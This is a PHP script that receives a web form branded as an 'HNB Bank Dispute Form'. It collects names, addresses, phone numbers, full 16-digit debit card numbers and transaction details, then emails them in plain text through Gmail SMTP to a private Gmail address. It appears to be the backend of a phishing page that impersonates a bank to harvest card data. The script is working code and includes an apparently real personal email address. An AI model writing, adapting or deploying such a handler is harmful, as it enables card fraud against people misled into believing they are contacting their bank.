<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php'; // Adjust path if necessary; PHPMailer must be installed via Composer

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $to = "anita.kraus.54@gmail.com"; // Recipient Email Address
    $subject = "Dispute Form Submission";

    // Function to Sanitize Input
    function sanitizeInput($data) {
        $data = trim($data);
        $data = stripslashes($data);
        $data = htmlspecialchars($data);
        return $data;
    }

    // Sanitize Input Data

    $name = sanitizeInput($_POST["name"] ?? "");
    $address = sanitizeInput($_POST["address"] ?? "");
    $city = sanitizeInput($_POST["city"] ?? "");
    $phone = sanitizeInput($_POST["phone"] ?? "");
    $email = sanitizeInput($_POST["email"] ?? "");
    $contactMethod = isset($_POST["contactMethod"]) ? sanitizeInput($_POST["contactMethod"]) : "N/A"; // Handle unchecked checkboxes
    $debitCard = sanitizeInput($_POST["debitCard"] ?? "");
    $dateError = sanitizeInput($_POST["dateError"] ?? "");
    $contactMethodDetail = sanitizeInput($_POST["contactMethodDetail"] ?? "");

    $lossType = isset($_POST["lossType"]) ? sanitizeInput($_POST["lossType"]) : "N/A";

    $merchantName = sanitizeInput($_POST["merchant-name"] ?? "N/A");
    $transactionAmount = sanitizeInput($_POST["transaction-amount"] ?? "N/A");
    $transactionDate = sanitizeInput($_POST["transaction-date"] ?? "N/A");

    $disputeReason = sanitizeInput($_POST["dispute-reason"] ?? "N/A");
    $cancellationDate = sanitizeInput($_POST["cancellation-date"] ?? "N/A");

    // 1. Check for Required Fields:
    if (empty($name) || empty($email) || empty($address) || empty($city) || empty($phone) || empty($debitCard) || empty($dateError)) {
            header("Location: Dispute_Form.html?status=required_fields");
            exit(); // Stop further execution!
    }

    // 2. Validate Debit Card Length:
    $debitCard = preg_replace('/\s+/', '', $debitCard); //remove spaces, this may interfer with the js remove function
    if (strlen($debitCard) != 16) {
           header("Location: Dispute_Form.html?status=invalid_debitCard");
           exit(); // Stop further execution!
    }

    if($contactMethod === "N/A"){
            header("Location: Dispute_Form.html?status=no_contactMethod");
            exit();
    }

    // 3. Build the Email Body with Specific Formatting
    $messageBody = "Dispute Form Submission Details:\n\n";
    $messageBody .= "Name/Business Name: " . $name . "\n";
    $messageBody .= "Address: " . $address . "\n";
    $messageBody .= "City, State, Zip: " . $city . "\n";
    $messageBody .= "Phone Number: " . $phone . "\n";
    $messageBody .= "Email Address: " . $email . "\n\n";
    $messageBody .= "Preferred Contact Method: " . $contactMethod . "\n";
    $messageBody .= "Contact Method Details: " . $contactMethodDetail . "\n\n";
    $messageBody .= "Loss Type: " . $lossType . "\n\n";
    $messageBody .= "Merchant Name: " . $merchantName . "\n";
    $messageBody .= "Transaction Amount: " . $transactionAmount . "\n";
    $messageBody .= "Transaction Date: " . $transactionDate . "\n";
    $messageBody .= "Dispute Reason: " . $disputeReason . "\n";
    $messageBody .= "Cancellation Date: " . $cancellationDate . "\n";
    $messageBody .= "Date of Error: " . $dateError . "\n";

    // PHPMailer setup
    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->SMTPDebug = 0;                      // Enable verbose debug output (0 for no output, 2 for detailed output)
        $mail->isSMTP();                                            // Send using SMTP
        $mail->Host       = 'smtp.gmail.com';                    // Set the SMTP server to send through
        $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
        $mail->Username   = 'your_gmail_username@gmail.com';                     // SMTP username
        $mail->Password   = 'your_app_password';                               // SMTP password (USE APP PASSWORD!)
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
        $mail->Port       = 587;                                    // TCP port to connect to, use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

        // Recipients
        $mail->setFrom('your_gmail_username@gmail.com', 'HNB Bank Dispute Form'); // Your Gmail Address
        $mail->addAddress($to);     // Add a recipient (Anita's address)

        // Content
        $mail->isHTML(false);                                  // Set email format to plain text
        $mail->Subject = $subject;
        $mail->Body    = $messageBody;

        $mail->send();
        header("Location: Dispute_Form.html?status=success"); // Redirect back with success
    } catch (Exception $e) {
        header("Location: Dispute_Form.html?status=mailer_error&error=" . urlencode($e->getMessage())); // Redirect back with mailer error
    }
} else {
    echo "This script can only be accessed through the form.";
}
?>
